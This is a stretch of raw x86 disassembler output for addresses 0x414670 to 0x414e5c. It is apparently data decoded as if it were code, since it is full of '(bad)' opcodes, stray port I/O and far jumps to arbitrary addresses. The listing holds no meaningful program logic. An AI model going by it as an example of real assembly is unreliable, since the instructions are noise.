  414670:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414673:	js     0x414688
  414675:	test   eax,0x7f22d1e2
  41467a:	push   esi
  41467b:	sbb    DWORD PTR [ecx-0x71],0xffffffbf
  41467f:	imul   ecx,esi,0x46
  414682:	sahf   
  414683:	lea    esi,[ebp-0x21]
  414686:	mov    ?,ebx
  414688:	jne    0x414634
  41468a:	aaa    
  41468b:	jbe    0x4146bc
  41468d:	leave  
  41468e:	jno    0x4146bc
  414690:	(bad)  
  414691:	ja     0x4146a3
  414693:	jl     0x6be0ec59
  414699:	jns    0x414703
  41469b:	xchg   ebp,eax
  41469c:	mov    WORD PTR [ebx+eax*2-0x303d294d],?
  4146a3:	push   esi
  4146a4:	xor    eax,0x1d2d8638
  4146a9:	sar    DWORD PTR [ecx+0x13],1
  4146ac:	out    dx,al
  4146ad:	imul   edx,DWORD PTR ds:0x6d12c085,0xfabe312
  4146b7:	jno    0x414660
  4146b9:	dec    edi
  4146ba:	and    BYTE PTR [edx-0x6b],bl
  4146bd:	dec    edx
  4146be:	mov    DWORD PTR [edx],ecx
  4146c0:	out    0x8c,al
  4146c2:	xchg   ebp,eax
  4146c3:	jmp    0xc271:0xd0c83838
  4146ca:	push   es
  4146cb:	jmp    edi
  4146cd:	dec    eax
  4146ce:	test   DWORD PTR [eax+0x704826e6],ecx
  4146d4:	scas   al,BYTE PTR es:[edi]
  4146d5:	jmp    0x4146a5
  4146d7:	mov    DWORD PTR [eax],esi
  4146d9:	in     eax,0x7e
  4146db:	push   cs
  4146dc:	sbb    eax,DWORD PTR [ecx]
  4146de:	or     al,0xef
  4146e0:	fidiv  WORD PTR [edx]
  4146e2:	cmp    BYTE PTR [eax],cl
  4146e4:	sub    edx,0x70
  4146e7:	mov    edx,0x7845c3a5
  4146ec:	fidiv  DWORD PTR [esi+edi*4+0x69]
  4146f0:	fstp   TBYTE PTR [ebp-0x4d]
  4146f3:	icebp  
  4146f4:	mov    ds:0xa399624d,al
  4146f9:	les    ecx,FWORD PTR [ebx]
  4146fb:	sbb    edx,DWORD PTR [edi-0x3a2733c9]
  414701:	mov    ah,0xde
  414703:	xor    DWORD PTR [ecx-0x61],edi
  414706:	jmp    0x414706
  414708:	pop    esp
  414709:	(bad)  
  41470a:	fisub  DWORD PTR [esi-0x49a4ebca]
  414710:	repz xchg edi,eax
  414712:	ds push es
  414714:	mov    BYTE PTR [eax+edx*4+0x2b],al
  414718:	cdq    
  414719:	ret    
  41471a:	mov    eax,0x9802edf2
  41471f:	shl    BYTE PTR [edi],1
  414721:	outs   dx,BYTE PTR ds:[esi]
  414722:	dec    eax
  414723:	inc    ebp
  414724:	xchg   ebp,eax
  414725:	and    eax,0x6bc3201b
  41472a:	sub    DWORD PTR [edx+0xe0974cb],ebx
  414730:	aad    0xda
  414732:	xchg   DWORD PTR [ebx],esi
  414734:	xor    DWORD PTR [edi],ecx
  414736:	jo     0x4146ea
  414738:	and    esi,DWORD PTR [ebp+0x6f]
  41473b:	cld    
  41473c:	sar    DWORD PTR [edi],0x4f
  41473f:	mov    ah,0xf5
  414741:	jb     0x41470f
  414743:	out    dx,eax
  414744:	in     eax,dx
  414745:	jo     0x414727
  414747:	inc    edi
  414748:	loopne 0x4146fb
  41474a:	xchg   ebx,eax
  41474b:	xchg   esi,eax
  41474c:	mov    edx,0xd886cccd
  414751:	das    
  414752:	pusha  
  414753:	mov    esp,0x2b185fb6
  414758:	aam    0x51
  41475a:	jnp    0x4147d4
  41475c:	je     0x414764
  41475e:	test   DWORD PTR ds:0xed01490f,0xef778505
  414768:	pop    edx
  414769:	xlat   BYTE PTR ds:[ebx]
  41476a:	mov    BYTE PTR ds:0xcf121fbc,0x4
  414771:	cmp    al,0x26
  414773:	sbb    al,dl
  414775:	jo     0x41470b
  414777:	in     al,dx
  414778:	sub    DWORD PTR [ecx-0x24bd087d],0xecd1e219
  414782:	dec    esi
  414783:	sar    BYTE PTR [ecx+edx*4-0x30],cl
  414787:	lock inc DWORD PTR [ebx-0x6e4717e9]
  41478e:	add    eax,0x4c5f60d6
  414793:	mov    edx,0xa05baef3
  414798:	or     BYTE PTR [ebx+0x66],0x9a
  41479c:	pop    ecx
  41479d:	mov    esi,DWORD PTR [edi+0x70]
  4147a0:	mov    ebp,0x70663641
  4147a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147a6:	fwait
  4147a7:	add    eax,0xaf24d308
  4147ac:	mov    dh,0xf6
  4147ae:	jp     0x414735
  4147b0:	sub    ch,BYTE PTR [esi]
  4147b2:	out    dx,eax
  4147b3:	(bad)  
  4147b4:	sar    DWORD PTR [ebp+0x72],cl
  4147b7:	rol    DWORD PTR [edi+ebx*1],0x6b
  4147bb:	cmp    eax,0x92a7bcf0
  4147c0:	popf   
  4147c1:	scas   eax,DWORD PTR es:[edi]
  4147c2:	adc    BYTE PTR [ecx],ah
  4147c4:	(bad)  
  4147c6:	mov    al,ds:0x906005de
  4147cb:	lahf   
  4147cc:	icebp  
  4147cd:	cmp    eax,0xe16e5803
  4147d2:	out    dx,al
  4147d3:	dec    eax
  4147d4:	call   0x7e0:0xd8ea8c3b
  4147db:	fcomp  QWORD PTR [ecx-0x73]
  4147de:	jmp    0xfb9f:0x47287850
  4147e5:	or     eax,0xc3993089
  4147ea:	jge    0x41479c
  4147ec:	cmp    BYTE PTR [ecx-0x78],ah
  4147ef:	push   0x98ff7ade
  4147f4:	xchg   esp,eax
  4147f5:	pop    esp
  4147f6:	cli    
  4147f7:	xor    BYTE PTR [ecx],ch
  4147f9:	jo     0x414816
  4147fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147fc:	ss inc edx
  4147fe:	pop    esp
  4147ff:	ficomp DWORD PTR [edi-0x231888f4]
  414805:	jmp    0x139f5576
  41480a:	sti    
  41480b:	pop    ss
  41480c:	fist   WORD PTR [esi+0x5a]
  41480f:	dec    edx
  414810:	mov    edi,0x4c68127
  414815:	mov    esp,0x1d3e8aba
  41481a:	push   0xd23bda7e
  41481f:	repnz push ds
  414821:	xor    al,BYTE PTR [esi+esi*8]
  414824:	and    al,BYTE PTR [ebx-0x3b1da8b7]
  41482a:	mov    ss,eax
  41482c:	push   es
  41482d:	bound  edi,QWORD PTR [esi+ecx*2+0x3fca007a]
  414834:	mov    al,ds:0x87a01cca
  414839:	fwait
  41483a:	mov    ebp,0x7a9cdb1d
  41483f:	inc    edx
  414840:	enter  0x8f34,0xf8
  414844:	aaa    
  414845:	sbb    DWORD PTR [eax+0x33bf5b97],esi
  41484b:	cmp    eax,0x3f84e28d
  414850:	neg    BYTE PTR [bx+di-0x15]
  414854:	(bad)  
  414855:	adc    dh,BYTE PTR [edx+eiz*8]
  414858:	mov    esp,ebp
  41485a:	adc    DWORD PTR [edi-0x5],eax
  41485d:	outs   dx,BYTE PTR ds:[esi]
  41485e:	mov    dh,0x4a
  414860:	das    
  414861:	sbb    eax,DWORD PTR [eax+0x1f]
  414864:	inc    edx
  414865:	sub    edi,ecx
  414867:	mov    ebp,0x4a413bdc
  41486c:	pop    edx
  41486d:	es pop esi
  41486f:	fist   WORD PTR [ecx-0x4742c55f]
  414875:	mov    ecx,0xa32407ca
  41487a:	not    BYTE PTR [eax]
  41487c:	dec    eax
  41487d:	push   ecx
  41487e:	jmp    0x41488a
  414880:	in     eax,dx
  414881:	test   eax,0x3ae09ce2
  414886:	mov    ds:0x6a14eec4,al
  41488b:	jmp    0xb0f6c38d
  414890:	fild   WORD PTR [ecx]
  414892:	mov    ebx,0xbbfefe7a
  414897:	xchg   ebp,eax
  414898:	fmul   DWORD PTR [esi-0x22]
  41489b:	cmp    BYTE PTR [eax],0xff
  41489e:	pop    edi
  41489f:	dec    eax
  4148a0:	jb     0x4148b7
  4148a2:	into   
  4148a3:	jp     0x41487e
  4148a5:	mov    ebx,0x501ae7e1
  4148aa:	mov    eax,ds:0x4c073d15
  4148af:	out    0xe2,al
  4148b1:	adc    DWORD PTR [ebx-0x21211e5],0x48
  4148b8:	and    DWORD PTR [edi],0x33
  4148bb:	scas   al,BYTE PTR es:[edi]
  4148bc:	(bad)  
  4148bd:	pop    esi
  4148be:	xor    DWORD PTR [edx+0x38],ecx
  4148c1:	pusha  
  4148c2:	push   ss
  4148c3:	test   DWORD PTR [ecx+0x3a],ecx
  4148c6:	into   
  4148c7:	popa   
  4148c8:	xchg   esp,eax
  4148c9:	dec    ebx
  4148ca:	retf   
  4148cb:	ret    0xd9ef
  4148ce:	mov    esi,DWORD PTR ds:0xfd7feb4f
  4148d4:	mov    bp,0x5477
  4148d8:	or     eax,DWORD PTR [edx-0xca1f5a9]
  4148de:	xchg   edx,eax
  4148df:	jb     0x4148ab
  4148e1:	ret    
  4148e2:	add    DWORD PTR [edi+0x71],ebp
  4148e5:	mov    bl,0x26
  4148e7:	loope  0x4148cb
  4148e9:	test   DWORD PTR [esi],0x83e953ef
  4148ef:	xchg   ecx,eax
  4148f0:	mov    cl,0x64
  4148f2:	mov    edi,0xab10292
  4148f7:	and    bh,ch
  4148f9:	inc    ebp
  4148fa:	stos   DWORD PTR es:[edi],eax
  4148fb:	add    BYTE PTR [ebx+ebx*1-0x52061e24],0x87
  414903:	sahf   
  414904:	repz xor ch,BYTE PTR [ebp+0x71025708]
  41490b:	add    dl,BYTE PTR [ebx+0x7f]
  41490e:	or     eax,0x68b04eb1
  414913:	ss aam 0x5
  414916:	out    dx,al
  414917:	bound  ecx,QWORD PTR [ebx]
  414919:	push   edx
  41491a:	dec    ecx
  41491b:	mov    BYTE PTR [edx-0xf4abb37],ah
  414921:	fnstsw WORD PTR [esi-0x64]
  414924:	jle    0x4148d0
  414926:	jne    0x4148c3
  414928:	imul   ebx,eax,0x191180aa
  41492e:	lods   al,BYTE PTR ds:[esi]
  41492f:	sar    edi,cl
  414931:	lock stc 
  414933:	loope  0x4148d5
  414935:	sub    ecx,DWORD PTR [ecx+0x1690ce82]
  41493b:	xchg   ecx,eax
  41493c:	out    0xe1,eax
  41493e:	pop    ss
  41493f:	sahf   
  414940:	xchg   edi,eax
  414941:	aam    0x9b
  414943:	jno    0x4149b9
  414945:	xchg   esp,eax
  414946:	sbb    eax,0x5095c574
  41494b:	push   0xffffffe0
  41494d:	xchg   edi,eax
  41494e:	pop    ebx
  41494f:	mov    dh,0x81
  414951:	mov    edx,0x844b1282
  414956:	daa    
  414957:	and    DWORD PTR [ecx+0x7b],ebp
  41495a:	jbe    0x414955
  41495c:	pcmpgtw mm0,QWORD PTR [ebx]
  41495f:	mov    ebp,0x7e73bc7e
  414964:	pushf  
  414965:	xor    BYTE PTR [edi+0x7438937e],0x5
  41496c:	loopne 0x414945
  41496e:	js     0x41490b
  414970:	jmp    0x532b4b48
  414975:	nop
  414976:	add    edx,esp
  414978:	into   
  414979:	mov    ebp,0x30671ffe
  41497e:	ins    DWORD PTR es:[edi],dx
  41497f:	jnp    0x41491f
  414981:	rcr    dl,1
  414983:	jmp    0x34dc:0x593f34f5
  41498a:	jecxz  0x414937
  41498c:	and    DWORD PTR [eax],esp
  41498e:	cwde   
  41498f:	loop   0x41496c
  414991:	cmp    DWORD PTR [eax+edi*4],ecx
  414994:	leave  
  414995:	call   0x126489da
  41499a:	pushf  
  41499b:	mov    ebx,0xdb893783
  4149a0:	loope  0x414a1e
  4149a2:	iret   
  4149a3:	xor    dl,bl
  4149a5:	imul   ecx,DWORD PTR [edx+0x52],0x85c72fd6
  4149ac:	jle    0x4149a0
  4149ae:	mov    ds:0xece77400,al
  4149b3:	fadd   DWORD PTR [ecx+ebp*1+0x2c]
  4149b7:	fsubp  st(7),st
  4149b9:	imul   esi,DWORD PTR [eax+0x42a97b5a],0x25
  4149c0:	lods   eax,DWORD PTR ds:[esi]
  4149c1:	cmp    DWORD PTR [edi+0x175f047d],0x16
  4149c8:	sub    esi,DWORD PTR [edi+0x50]
  4149cb:	imul   edx,DWORD PTR [ebx],0xffffff8b
  4149ce:	rcr    edx,0x59
  4149d1:	(bad)  [esi+esi*1-0x26]
  4149d5:	or     ecx,ebx
  4149d7:	dec    edi
  4149d8:	in     al,dx
  4149d9:	add    al,0x44
  4149db:	pop    ebx
  4149dc:	repnz mov dh,0x9b
  4149df:	mov    dl,0x9c
  4149e1:	add    eax,eax
  4149e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149e4:	push   esp
  4149e5:	sub    al,BYTE PTR [eax-0x42]
  4149e8:	pusha  
  4149e9:	repnz cwde 
  4149eb:	jne    0x414994
  4149ed:	out    0x47,al
  4149ef:	dec    ebp
  4149f0:	test   BYTE PTR [edi+0x7e],dh
  4149f3:	out    0x75,al
  4149f5:	es sti 
  4149f7:	mov    bl,0xe1
  4149f9:	pop    ds
  4149fa:	sub    al,0xaf
  4149fc:	lock not BYTE PTR [edi-0x1396c8ae]
  414a03:	dec    ecx
  414a04:	push   ecx
  414a05:	sahf   
  414a06:	nop
  414a07:	add    ch,BYTE PTR [eax+eax*1-0x4b4015b2]
  414a0e:	push   cs
  414a0f:	mov    edi,0xb41bfaa9
  414a14:	pop    ecx
  414a15:	lahf   
  414a16:	xchg   BYTE PTR [eax+ebp*8],bl
  414a19:	ror    dh,1
  414a1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a1c:	lds    esp,FWORD PTR [esi+0x1f2402a1]
  414a22:	fcom   DWORD PTR [ebp-0x3a]
  414a25:	enter  0x6f37,0x69
  414a29:	sar    BYTE PTR [eax],cl
  414a2b:	mov    DWORD PTR [eax-0x14d003b6],esp
  414a31:	xor    bh,BYTE PTR [edx-0xa]
  414a34:	xor    eax,0xeeddef1d
  414a39:	jae    0x414a76
  414a3b:	imul   ebp,DWORD PTR [ecx-0x79],0x7e
  414a3f:	jae    0x414a52
  414a41:	jle    0x414a7e
  414a43:	loop   0x4149fb
  414a45:	imul   ebx,DWORD PTR [ebx],0x338234c2
  414a4b:	pop    edi
  414a4c:	xchg   ecx,eax
  414a4d:	jle    0x414abe
  414a4f:	push   0xffffffa9
  414a51:	dec    esp
  414a52:	adc    DWORD PTR [ebx+0x59],0xc4681bdb
  414a59:	in     eax,0xeb
  414a5b:	loop   0x4149f1
  414a5d:	sbb    edx,ecx
  414a5f:	add    ebx,DWORD PTR [ebx+0x2e35e8c0]
  414a65:	xor    DWORD PTR ds:0x78040bc0,0xe
  414a6c:	ret    0x816c
  414a6f:	fist   DWORD PTR [edx]
  414a71:	push   0xa36dfdf0
  414a76:	inc    edx
  414a77:	pop    ebp
  414a78:	in     al,dx
  414a79:	clc    
  414a7a:	out    dx,al
  414a7b:	push   ds
  414a7c:	push   ebp
  414a7d:	jecxz  0x414a47
  414a7f:	and    dh,dl
  414a81:	(bad)  
  414a82:	std    
  414a83:	cmp    eax,0x193a146
  414a88:	ins    BYTE PTR es:[edi],dx
  414a89:	mov    ecx,0x9355ba9a
  414a8e:	push   edx
  414a8f:	push   cs
  414a90:	stos   DWORD PTR es:[edi],eax
  414a91:	mov    ss,WORD PTR [ebp-0xa631f6c]
  414a97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a98:	mov    BYTE PTR [ebp-0x68038603],bl
  414a9e:	dec    esp
  414a9f:	pop    ecx
  414aa0:	dec    edx
  414aa1:	xchg   ebx,eax
  414aa2:	push   ds
  414aa3:	mov    ds:0x136e4f6b,al
  414aa8:	cmp    al,0x2f
  414aaa:	retf   0x2d5b
  414aad:	and    ah,BYTE PTR [edi]
  414aaf:	sub    ch,BYTE PTR [ebx]
  414ab1:	(bad)  
  414ab2:	enter  0xe857,0x41
  414ab6:	mov    ds:0x11fa5fb5,eax
  414abb:	pop    edx
  414abc:	pop    esi
  414abd:	push   cs
  414abe:	push   esi
  414abf:	sub    ebp,DWORD PTR [ebx-0x42]
  414ac2:	jnp    0x414b37
  414ac4:	adc    DWORD PTR [edx-0x1bc2ffe6],0x3045e9bf
  414ace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414acf:	jo     0x414b36
  414ad1:	jmp    DWORD PTR [edi]
  414ad3:	mov    edi,DWORD PTR [edi+0x709cb024]
  414ad9:	sti    
  414ada:	add    al,0x9c
  414adc:	jnp    0x414a69
  414ade:	or     al,0xa6
  414ae0:	or     ah,dh
  414ae2:	or     esi,DWORD PTR [ebx]
  414ae4:	ds in  al,0xf8
  414ae7:	pushf  
  414ae8:	js     0x414a9e
  414aea:	adc    bl,BYTE PTR [eax+eax*8]
  414aed:	fucomi st,st(3)
  414aef:	bound  ebp,QWORD PTR ds:0xc309daca
  414af5:	aaa    
  414af6:	inc    esi
  414af7:	cmp    BYTE PTR [ebx],bl
  414af9:	mov    esi,0x520b3211
  414afe:	cmp    DWORD PTR [ebx],eax
  414b00:	push   ds
  414b01:	jle    0x414b67
  414b03:	aad    0x5a
  414b05:	aam    0xf1
  414b07:	xchg   ebp,eax
  414b08:	ficomp WORD PTR ds:0x18cfa11e
  414b0e:	fcmovu st,st(6)
  414b10:	adc    BYTE PTR [esi],dh
  414b12:	call   0x4a7b3cf
  414b17:	enter  0x9fbc,0x6b
  414b1b:	call   0x4cef2861
  414b20:	or     ch,BYTE PTR [ecx-0x4b]
  414b23:	ss mov ah,0x90
  414b26:	imul   ebp,DWORD PTR [edi],0xffffffab
  414b29:	ins    DWORD PTR es:[edi],dx
  414b2a:	bound  eax,QWORD PTR [esi]
  414b2c:	dec    ebx
  414b2d:	dec    ecx
  414b2e:	in     eax,0x6e
  414b30:	jno    0x414b27
  414b32:	dec    eax
  414b33:	fild   QWORD PTR [eax+esi*1+0x38656b87]
  414b3a:	or     cl,cl
  414b3c:	and    DWORD PTR [eax-0x78f0f009],ebx
  414b42:	les    esp,FWORD PTR [esi+0x3c2988c8]
  414b48:	jo     0x414b79
  414b4a:	neg    BYTE PTR [eax-0x66]
  414b4d:	mov    bl,0x1a
  414b4f:	mov    ds,WORD PTR [ecx+0x3b0d0fdc]
  414b55:	xchg   DWORD PTR ss:[ebx],esi
  414b58:	ins    DWORD PTR es:[edi],dx
  414b59:	retf   0x8065
  414b5c:	sti    
  414b5d:	gs loop 0x414b7b
  414b60:	xchg   BYTE PTR [eax+0x46],ah
  414b63:	jmp    0x7a81:0xa79bffd
  414b6a:	in     eax,0xc8
  414b6c:	sbb    DWORD PTR [edx+eiz*2],esp
  414b6f:	jb     0x414b37
  414b71:	aaa    
  414b72:	jl     0x414b04
  414b74:	(bad)
  414b77:	inc    ebx
  414b78:	sbb    BYTE PTR [eax+0x100a7cc2],0x3b
  414b7f:	or     BYTE PTR [edi],ch
  414b81:	cmp    BYTE PTR ds:0x2226b8d8,ah
  414b87:	nop
  414b88:	arpl   WORD PTR [edx+0x75],sp
  414b8b:	mov    eax,0x46980c44
  414b90:	mov    esp,0x9ec06e60
  414b95:	leave  
  414b96:	das    
  414b97:	or     ah,BYTE PTR [ebx+0x1406cd86]
  414b9d:	adc    dl,bl
  414b9f:	inc    ebx
  414ba0:	out    0xd4,eax
  414ba2:	sbb    eax,0xfb1f4927
  414ba7:	jb     0x414b46
  414ba9:	cld    
  414baa:	fsubr  QWORD PTR [esi]
  414bac:	mov    cl,0x14
  414bae:	ja     0x414c08
  414bb0:	add    eax,0x414a490d
  414bb5:	ja     0x414b88
  414bb7:	mov    ds:0xd21b749e,eax
  414bbc:	jp     0x414be0
  414bbe:	mov    ah,0xf0
  414bc0:	fmul   st(1),st
  414bc2:	aas    
  414bc3:	mov    bh,0xf3
  414bc5:	add    DWORD PTR [ebx-0x3],ebp
  414bc8:	and    al,0x4d
  414bca:	sti    
  414bcb:	fst    DWORD PTR [ebx+esi*1+0x2e]
  414bcf:	hlt    
  414bd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bd1:	les    edi,FWORD PTR [eax-0x4023064a]
  414bd7:	jge    0x414b87
  414bd9:	shl    DWORD PTR [ebp-0x659d2419],1
  414bdf:	jo     0x414b7f
  414be1:	mov    bl,ch
  414be3:	addr16 repnz aaa 
  414be6:	xchg   DWORD PTR [edi+0x18],esp
  414be9:	cmp    DWORD PTR [eax-0x6bee4d3a],0x9965bb96
  414bf3:	xlat   BYTE PTR ds:[ebx]
  414bf4:	adc    DWORD PTR [eax+esi*4+0x73],edi
  414bf8:	clc    
  414bf9:	push   0x5e
  414bfb:	jmp    0x1438b4e1
  414c00:	xchg   ebp,eax
  414c01:	adc    DWORD PTR [esi+0x5d],0x9b890104
  414c08:	adc    ecx,edi
  414c0a:	cmp    DWORD PTR [ecx],ebp
  414c0c:	fldenv [eax-0x2a]
  414c0f:	adc    ah,BYTE PTR [edi]
  414c11:	jg     0x414c7a
  414c13:	out    dx,al
  414c14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c15:	ja     0x414c46
  414c17:	xchg   esi,eax
  414c18:	stos   DWORD PTR es:[edi],eax
  414c19:	mov    al,ds:0x288a6b2
  414c1e:	(bad)  
  414c1f:	aad    0x8b
  414c21:	out    0xc6,al
  414c23:	inc    edi
  414c24:	nop
  414c25:	or     ch,bh
  414c27:	mov    WORD PTR [ecx-0x15341a13],fs
  414c2d:	mov    al,0xca
  414c2f:	vandps ymm7,ymm2,YMMWORD PTR [edi+0x31]
  414c34:	and    al,0x77
  414c36:	lahf   
  414c37:	pop    ebp
  414c38:	retf   
  414c39:	pop    ss
  414c3a:	push   0xb1c0c060
  414c3f:	sub    edi,DWORD PTR [esi-0x25]
  414c42:	cld    
  414c43:	mov    ds:0x3b5744ef,eax
  414c48:	enter  0xfac8,0x8b
  414c4c:	and    DWORD PTR [edx],ebp
  414c4e:	mov    edx,0x94b48c41
  414c53:	add    al,0xb9
  414c55:	aad    0xb2
  414c57:	jmp    DWORD PTR [ebx-0x4]
  414c5a:	jns    0x414ccb
  414c5c:	out    dx,al
  414c5d:	cmp    eax,0x15ad1ee
  414c62:	(bad)
  414c66:	sbb    DWORD PTR [ecx],0x3e378d82
  414c6c:	dec    edx
  414c6d:	pushf  
  414c6e:	cdq    
  414c6f:	push   ecx
  414c70:	xchg   esp,eax
  414c71:	sahf   
  414c72:	nop
  414c73:	iret   
  414c74:	sub    ch,BYTE PTR fs:[edx]
  414c77:	or     DWORD PTR [edi],ebx
  414c79:	jb     0x414c1b
  414c7b:	xchg   BYTE PTR [ecx],bh
  414c7d:	aas    
  414c7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c7f:	imul   esi,DWORD PTR [eax-0x5d19220f],0xfcb3a727
  414c89:	bsr    ebp,eax
  414c8c:	fild   DWORD PTR [edi]
  414c8e:	ret    0xe81
  414c91:	inc    esi
  414c92:	sub    bl,cl
  414c94:	inc    ebx
  414c95:	cmp    al,0xda
  414c97:	test   DWORD PTR [ebp+edx*8-0x2e0d6d65],ecx
  414c9e:	sub    al,0x7c
  414ca0:	sbb    DWORD PTR [esi-0x600b08e0],ebx
  414ca6:	clc    
  414ca7:	and    esp,DWORD PTR [esi+esi*8+0x2e4d175]
  414cae:	xchg   edi,eax
  414caf:	push   edi
  414cb0:	adc    DWORD PTR [esi],esp
  414cb2:	cmp    edx,DWORD PTR [edi+0x58]
  414cb5:	mov    bh,0x4c
  414cb7:	pusha  
  414cb8:	js     0x414c82
  414cba:	or     bh,bl
  414cbc:	(bad)  
  414cbd:	cmp    eax,0xdb75521
  414cc2:	out    dx,eax
  414cc3:	stos   DWORD PTR es:[edi],eax
  414cc4:	mov    DWORD PTR [eax+edi*8+0xe840236],edx
  414ccb:	sbb    al,ch
  414ccd:	(bad)  
  414cce:	sbb    BYTE PTR [ebx],dh
  414cd0:	ror    BYTE PTR [ebx],cl
  414cd2:	dec    edx
  414cd3:	(bad)  
  414cd4:	pop    ecx
  414cd5:	xchg   esp,eax
  414cd6:	repnz popa 
  414cd8:	push   0xffffff99
  414cda:	push   ecx
  414cdb:	add    eax,0x98c312fc
  414ce0:	aam    0xcc
  414ce2:	sbb    eax,0x67934364
  414ce7:	std    
  414ce8:	push   cs
  414ce9:	(bad)  
  414cea:	ins    BYTE PTR es:[edi],dx
  414ceb:	inc    ebp
  414cec:	out    dx,al
  414ced:	dec    edi
  414cee:	sbb    DWORD PTR [ecx+0x33e5ad8b],edi
  414cf4:	inc    esp
  414cf5:	mov    eax,ds:0xa10a6d75
  414cfa:	ret    
  414cfb:	je     0x414cd8
  414cfd:	mov    bl,0x8b
  414cff:	pop    ds
  414d00:	sbb    BYTE PTR [edi],ch
  414d02:	cmp    edi,DWORD PTR [edi+0x7e78bf7f]
  414d08:	int3   
  414d09:	lock shr BYTE PTR [ebx+0x79b70554],0xd
  414d11:	(bad)  
  414d12:	sbb    BYTE PTR [ebp-0x24],ch
  414d15:	inc    eax
  414d16:	sar    bl,cl
  414d18:	or     al,0x5a
  414d1a:	sbb    BYTE PTR [esp+edi*8-0xd],cl
  414d1e:	std    
  414d1f:	push   ebp
  414d20:	jae    0x414d69
  414d22:	sahf   
  414d23:	pushf  
  414d24:	add    BYTE PTR [ebx+0x66],0xce
  414d28:	adc    DWORD PTR [eax+eiz*4],ebp
  414d2b:	cmp    eax,DWORD PTR [esi+0x1d]
  414d2e:	xor    BYTE PTR [eax],al
  414d30:	outs   dx,DWORD PTR ds:[esi]
  414d31:	xor    DWORD PTR [esi+0x1f],ecx
  414d34:	xor    DWORD PTR ds:0x97171dd2,0xf5b7723
  414d3e:	unpcklps xmm0,XMMWORD PTR [ecx+ecx*4+0x4a7cd37b]
  414d46:	inc    ecx
  414d47:	int3   
  414d48:	xor    BYTE PTR [ebx],0x3
  414d4b:	xor    eax,0x253337d6
  414d50:	mov    bh,0xda
  414d52:	loope  0x414d73
  414d54:	lahf   
  414d55:	shr    BYTE PTR [edx],0x1f
  414d58:	ins    BYTE PTR es:[edi],dx
  414d59:	xchg   edx,eax
  414d5a:	inc    eax
  414d5b:	cs je  0x414cff
  414d5e:	fcomp  QWORD PTR [edx+0x6d]
  414d61:	pusha  
  414d62:	pop    ebp
  414d63:	dec    ebp
  414d64:	sub    BYTE PTR [edx-0x5f],0xcb
  414d68:	and    ah,BYTE PTR [ecx+0x50154bcb]
  414d6e:	mov    ebp,0xc672a2b2
  414d73:	nop
  414d74:	enter  0x1171,0x92
  414d78:	or     BYTE PTR [ebp+0x4999c2c5],dl
  414d7e:	outs   dx,DWORD PTR ds:[esi]
  414d7f:	add    ch,al
  414d81:	jnp    0x414da5
  414d83:	jns    0x414d27
  414d85:	(bad)  
  414d86:	jmp    0x42c52ca4
  414d8b:	nop
  414d8c:	fistp  DWORD PTR [edx-0x2ebe749f]
  414d92:	outs   dx,DWORD PTR ds:[esi]
  414d93:	popa   
  414d94:	std    
  414d95:	hlt    
  414d96:	adc    BYTE PTR [ebp+0x36],bl
  414d99:	les    ecx,FWORD PTR [edi]
  414d9b:	cli    
  414d9c:	test   eax,0x959550ad
  414da1:	iret   
  414da2:	inc    esi
  414da3:	in     eax,0x39
  414da5:	and    al,0xf7
  414da7:	push   ecx
  414da8:	ror    DWORD PTR [edx+0x73f59833],0x68
  414daf:	cmc    
  414db0:	jmp    0x4a6f278c
  414db5:	push   ds
  414db6:	out    dx,al
  414db7:	jle    0x414de2
  414db9:	and    DWORD PTR [eax+0xe4b0d42],eax
  414dbf:	or     al,0x4
  414dc1:	push   ss
  414dc2:	sbb    ebp,DWORD PTR [edi+0x67]
  414dc5:	xchg   edx,eax
  414dc6:	jae    0x414db4
  414dc8:	jnp    0x414e35
  414dca:	sub    DWORD PTR [ebx+0x32],0x707318b5
  414dd1:	and    al,0x88
  414dd3:	mov    ds:0xc4a992c4,al
  414dd8:	or     eax,esi
  414dda:	fmul   DWORD PTR [esi*8+0x30f22716]
  414de1:	pop    esi
  414de2:	sti    
  414de3:	xchg   edi,eax
  414de4:	push   es
  414de5:	pusha  
  414de6:	push   ebp
  414de7:	mov    bl,0x3f
  414de9:	and    eax,0x91b07fc9
  414dee:	push   esi
  414def:	jne    0x414dc9
  414df1:	add    ch,BYTE PTR [edx-0x393c9c66]
  414df7:	mov    cl,BYTE PTR [edi+0x2083bec1]
  414dfd:	and    DWORD PTR [eax+0x14],eax
  414e00:	inc    edx
  414e01:	jmp    0x414db9
  414e03:	aad    0x2c
  414e05:	jno    0x414d91
  414e07:	xor    eax,0x6d462644
  414e0c:	inc    esi
  414e0d:	imul   edi,edi,0xffffffd3
  414e10:	xchg   esp,eax
  414e11:	jle    0x414df0
  414e13:	xchg   edx,eax
  414e14:	sbb    cl,BYTE PTR [eax]
  414e16:	jbe    0x414da8
  414e18:	and    dh,BYTE PTR [ecx]
  414e1a:	xor    BYTE PTR [ebx],bh
  414e1c:	pop    eax
  414e1d:	test   al,0xb9
  414e1f:	or     BYTE PTR [ebx*2-0x32fe14e0],al
  414e26:	xor    cl,0xd
  414e29:	or     ebx,edi
  414e2b:	mov    eax,ds:0x786f1a13
  414e30:	fwait
  414e31:	or     eax,0x32088885
  414e36:	xor    eax,0x222149c6
  414e3b:	lods   al,BYTE PTR ds:[esi]
  414e3c:	in     eax,0xde
  414e3e:	xchg   DWORD PTR [eax],edx
  414e40:	xor    DWORD PTR [ecx-0x669d8006],edx
  414e46:	mov    ds:0x2ccd8d69,eax
  414e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e4c:	(bad)  
  414e4e:	out    0x14,al
  414e50:	jge    0x414e34
  414e52:	inc    ebx
  414e53:	push   ebp
  414e54:	or     al,0x1a
  414e56:	inc    ebp
  414e57:	fcmovbe st,st(0)
  414e59:	xchg   edx,eax
  414e5a:	cli    
  414e5b:	ret    
  414e5c:	addr16 ss test al,0x48
